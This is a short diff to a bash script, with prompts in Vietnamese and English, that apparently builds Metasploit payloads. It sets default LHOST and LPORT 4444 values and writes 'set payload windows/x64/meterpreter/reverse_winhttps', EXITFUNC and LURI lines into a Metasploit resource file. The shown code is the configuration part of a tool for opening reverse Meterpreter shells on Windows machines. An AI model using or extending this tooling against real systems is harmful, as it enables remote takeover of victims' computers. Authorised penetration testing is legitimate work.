@@ -1,11 +1,11 @@
 function defaul_payload_options {
-	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
+	lhost=$local_ip
 	lport="4444"
 	exitfunc="process"
 	luri=""
 }
 function payload_compare {
-lhost_lenght=`echo "$lhost" | awk '{print length}'`
+lhost_lenght=`echo $lhost | awk '{print length}'`
 	if  [ "$lhost_lenght" -le 18 ]; then
 		payload1
 	else
@@ -148,6 +148,7 @@ Các tùy chọn của tải trọng (windows/x64/meterpreter/reverse_winhttps):
    LHOST          $lhost$yes    Địa chỉ lắng nghe.
    LPORT          $lport$yes    Cổng lắng nghe.
    LURI           $luri$no   Đường dẫn HTTP.
+   
 !
 elif [ "$language" = "EN" ]; then
 yes="     yes"
@@ -203,6 +204,7 @@ rc_file="$payload_path_rc_file/file.rc"
 config_file="$payload_path_present/Config/config"
 	echo "set payload windows/x64/meterpreter/reverse_winhttps" >> $rc_file
 	echo "set EXITFUNC $exitfunc" >> $rc_file
+	echo "set LURI $luri" >> $rc_file
 	paylo="windows/x64/meterpreter/reverse_winhttps"
 	lhost=$lhost
 	lport=$lport
